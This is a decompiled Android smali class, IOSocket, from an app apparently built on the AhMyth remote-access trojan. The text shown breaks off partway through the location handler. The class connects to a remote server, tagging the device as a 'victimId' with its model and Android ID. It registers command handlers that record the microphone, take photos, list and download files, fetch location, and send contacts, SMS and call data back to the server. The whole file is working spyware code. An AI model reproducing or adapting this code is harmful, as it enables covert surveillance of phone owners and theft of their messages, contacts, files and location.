.class public Lahmyth/mine/king/ahmyth/IOSocket;
.super Ljava/lang/Object;
.source "IOSocket.java"


# static fields
.field private static final INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

.field private static final TAG:Ljava/lang/String; = "IOSocket"


# instance fields
.field private ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 23
    new-instance v0, Lahmyth/mine/king/ahmyth/IOSocket;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/IOSocket;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    return-void
.end method

.method private constructor <init>()V
    .locals 0

    .line 26
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static connect(Ljava/lang/String;I)V
    .locals 8

    const-string v0, ":"

    .line 47
    sget-object v1, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v2, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "IOSocket"

    if-eqz v2, :cond_0

    invoke-virtual {v2}, Lio/socket/client/Socket;->connected()Z

    move-result v2

    if-eqz v2, :cond_0

    const-string p0, "Socket ya conectado"

    .line 48
    invoke-static {v3, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 52
    :cond_0
    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v2

    .line 54
    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v4, "android_id"

    .line 53
    invoke-static {v2, v4}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 58
    new-instance v4, Lio/socket/client/IO$Options;

    invoke-direct {v4}, Lio/socket/client/IO$Options;-><init>()V

    const-wide/16 v5, -0x1

    .line 59
    iput-wide v5, v4, Lio/socket/client/IO$Options;->timeout:J

    const/4 v5, 0x1

    .line 60
    iput-boolean v5, v4, Lio/socket/client/IO$Options;->reconnection:Z

    const-wide/16 v5, 0x1388

    .line 61
    iput-wide v5, v4, Lio/socket/client/IO$Options;->reconnectionDelay:J

    const-wide/32 v5, 0x7fffffff

    .line 62
    iput-wide v5, v4, Lio/socket/client/IO$Options;->reconnectionDelayMax:J

    .line 65
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getLocalIpAddress()Ljava/lang/String;

    move-result-object v5

    .line 66
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 68
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "http://"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p0, "?victimId="

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 69
    invoke-static {v5}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "&model="

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 70
    invoke-static {p0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "&manf="

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "&release="

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "&id="

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    .line 75
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Conectando a socket en: "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v3, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    invoke-static {p0, v4}, Lio/socket/client/IO;->socket(Ljava/lang/String;Lio/socket/client/IO$Options;)Lio/socket/client/Socket;

    move-result-object p0

    iput-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "connect"

    .line 79
    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$_0h8gPZBuS9unWZuZtDprS610QA;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$_0h8gPZBuS9unWZuZtDprS610QA;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 83
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "disconnect"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$-vXBln6ibyVJbb21LMxhh4TqM2g;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$-vXBln6ibyVJbb21LMxhh4TqM2g;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 87
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "connect_error"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$WhIT8z6m_Zmy5HThUwWIG3ulU00;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$WhIT8z6m_Zmy5HThUwWIG3ulU00;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 91
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "connect_timeout"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$3jAuHfiEtmCPVcsM2-_1A0_wQ_4;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$3jAuHfiEtmCPVcsM2-_1A0_wQ_4;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 95
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "error"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$fQXScw3eafWBadnl_Vuzw5c4R-U;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$fQXScw3eafWBadnl_Vuzw5c4R-U;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 99
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "reconnect"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$XQGJd5FdfS4Pj93aHsASgYpbbXw;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$XQGJd5FdfS4Pj93aHsASgYpbbXw;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 103
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "reconnect_attempt"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$qj8R0ufOGyOAIu4M5J46eDXZqzY;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$qj8R0ufOGyOAIu4M5J46eDXZqzY;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 107
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "reconnect_failed"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$JqlQq-V43W8K-PZGMmTWaZAMXmY;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$JqlQq-V43W8K-PZGMmTWaZAMXmY;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 114
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "mic-record"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Xb-3tAJFJgH0UNgwv_vsk13MEic;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Xb-3tAJFJgH0UNgwv_vsk13MEic;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 141
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-calls"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$gLprR1-aC7p6nXf0IA_OEfYeTzI;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$gLprR1-aC7p6nXf0IA_OEfYeTzI;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 148
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-contacts"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$CmV4jfM7qdrOhkoJf26Fo5rUL9g;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$CmV4jfM7qdrOhkoJf26Fo5rUL9g;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 154
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-sms"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$K99KrmiVx89tfY9zs5BM5JBDXsU;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$K99KrmiVx89tfY9zs5BM5JBDXsU;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 160
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-photo"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$epovP0xiDX1mp6OForV2l5VS5zA;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$epovP0xiDX1mp6OForV2l5VS5zA;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 182
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-camera-list"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$TN9wOmRScOS4bVQZxQVl0ycvaZ4;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$TN9wOmRScOS4bVQZxQVl0ycvaZ4;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 188
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-files"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Thgy2SHQSV3LkgONUnPRNShZFK4;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Thgy2SHQSV3LkgONUnPRNShZFK4;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 200
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "download-file"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$nm20Q56X-KCjWJ6AIWGfE7PQCcU;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$nm20Q56X-KCjWJ6AIWGfE7PQCcU;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 212
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-location"

    sget-object v0, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$vO7PcrDz3NUcIcfjkTgu6N6WbP8;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$vO7PcrDz3NUcIcfjkTgu6N6WbP8;

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 243
    iget-object p0, v1, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {p0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const-string p1, "Error al conectar socket"

    .line 248
    invoke-static {v3, p1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_0

    :catch_1
    move-exception p0

    const-string p1, "URL de socket inv\u00e1lida"

    .line 246
    invoke-static {v3, p1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public static disconnect()V
    .locals 2

    .line 253
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v1, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    if-eqz v1, :cond_0

    .line 254
    invoke-virtual {v1}, Lio/socket/client/Socket;->disconnect()Lio/socket/client/Socket;

    const/4 v1, 0x0

    .line 255
    iput-object v1, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string v0, "IOSocket"

    const-string v1, "Socket desconectado"

    .line 256
    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    return-void
.end method

.method public static getInstance()Lahmyth/mine/king/ahmyth/IOSocket;
    .locals 1

    .line 261
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    return-object v0
.end method

.method public static getLocalIpAddress()Ljava/lang/String;
    .locals 4

    .line 31
    :try_start_0
    invoke-static {}, Ljava/net/NetworkInterface;->getNetworkInterfaces()Ljava/util/Enumeration;

    move-result-object v0

    :cond_0
    invoke-interface {v0}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 32
    invoke-interface {v0}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/net/NetworkInterface;

    .line 33
    invoke-virtual {v1}, Ljava/net/NetworkInterface;->getInetAddresses()Ljava/util/Enumeration;

    move-result-object v1

    :cond_1
    invoke-interface {v1}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 34
    invoke-interface {v1}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/net/InetAddress;

    .line 35
    invoke-virtual {v2}, Ljava/net/InetAddress;->isLoopbackAddress()Z

    move-result v3

    if-nez v3, :cond_1

    instance-of v3, v2, Ljava/net/Inet4Address;

    if-eqz v3, :cond_1

    .line 36
    invoke-virtual {v2}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    const-string v1, "IOSocket"

    const-string v2, "Error obteniendo IP local"

    .line 41
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    const-string v0, "0.0.0.0"

    return-object v0
.end method

.method static synthetic lambda$connect$0([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Socket conectado al servidor"

    .line 80
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$1([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Socket desconectado del servidor"

    .line 84
    invoke-static {p0, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$10([Ljava/lang/Object;)V
    .locals 3

    .line 149
    invoke-static {}, Lahmyth/mine/king/ahmyth/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object p0

    .line 150
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, "[]"

    :goto_0
    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "contacts-data"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$connect$11([Ljava/lang/Object;)V
    .locals 3

    .line 155
    invoke-static {}, Lahmyth/mine/king/ahmyth/SMSManager;->getSMSList()Lorg/json/JSONObject;

    move-result-object p0

    .line 156
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, "[]"

    :goto_0
    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "sms-data"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$connect$12([Ljava/lang/Object;)V
    .locals 4

    const-string v0, "IOSocket"

    const/4 v1, 0x0

    .line 163
    :try_start_0
    array-length v2, p0

    if-lez v2, :cond_2

    .line 164
    aget-object p0, p0, v1

    .line 165
    instance-of v2, p0, Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, "cameraID"

    if-eqz v2, :cond_0

    .line 166
    :try_start_1
    check-cast p0, Lorg/json/JSONObject;

    invoke-virtual {p0, v3, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    :goto_0
    move v1, p0

    goto :goto_1

    .line 167
    :cond_0
    instance-of v2, p0, Ljava/lang/String;

    if-eqz v2, :cond_1

    .line 168
    new-instance v2, Lorg/json/JSONObject;

    check-cast p0, Ljava/lang/String;

    invoke-direct {v2, p0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 169
    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    goto :goto_0

    .line 170
    :cond_1
    instance-of v2, p0, Ljava/lang/Integer;

    if-eqz v2, :cond_2

    .line 171
    check-cast p0, Ljava/lang/Integer;

    invoke-virtual {p0}, Ljava/lang/Integer;->intValue()I

    move-result p0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const-string v2, "Error leyendo cameraID en get-photo"

    .line 175
    invoke-static {v0, v2, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 177
    :cond_2
    :goto_1
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "get-photo usando cameraID="

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v0, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 178
    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;

    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V

    return-void
.end method

.method static synthetic lambda$connect$13([Ljava/lang/Object;)V
    .locals 3

    .line 183
    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;

    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/CameraManager;->findCameraList()Lorg/json/JSONObject;

    move-result-object p0

    .line 184
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, "{}"

    :goto_0
    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "camera-list"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$connect$14([Ljava/lang/Object;)V
    .locals 3

    const-string v0, "/"

    const/4 v1, 0x0

    .line 191
    :try_start_0
    array-length v2, p0

    if-lez v2, :cond_0

    aget-object v2, p0, v1

    instance-of v2, v2, Ljava/lang/String;

    if-eqz v2, :cond_0

    .line 192
    aget-object p0, p0, v1

    check-cast p0, Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, p0

    goto :goto_0

    :catch_0
    nop

    .line 195
    :cond_0
    :goto_0
    invoke-static {v0}, Lahmyth/mine/king/ahmyth/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p0

    .line 196
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    if-eqz p0, :cond_1

    invoke-virtual {p0}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_1

    :cond_1
    const-string p0, "[]"

    :goto_1
    aput-object p0, v2, v1

    const-string p0, "files-data"

    invoke-virtual {v0, p0, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$connect$15([Ljava/lang/Object;)V
    .locals 3

    const-string v0, ""

    .line 203
    :try_start_0
    array-length v1, p0

    if-lez v1, :cond_0

    const/4 v1, 0x0

    aget-object v2, p0, v1

    instance-of v2, v2, Ljava/lang/String;

    if-eqz v2, :cond_0

    .line 204
    aget-object p0, p0, v1

    check-cast p0, Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, p0

    .line 207
    :catch_0
    :cond_0
    invoke-static {v0}, Lahmyth/mine/king/ahmyth/FileManager;->downloadFile(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic lambda$connect$17([Ljava/lang/Object;)V
    .locals 3

    const-string p0, "IOSocket"

    const-string v0, "Recibido evento get-location"

    .line 213
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 215
    :try_start_0
    new-instance v0, Lahmyth/mine/king/ahmyth/LocManager;

    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/LocManager;-><init>(Landroid/content/Context;)V

    .line 216
    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$mtSobPOzua7fv44RLs_SqMlLxRQ;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$mtSobPOzua7fv44RLs_SqMlLxRQ;

    invoke-virtual {v0, v1}, Lahmyth/mine/king/ahmyth/LocManager;->getLocationAsync(Lahmyth/mine/king/ahmyth/LocManager$LocationResultCallback;)V
    :try_end_0
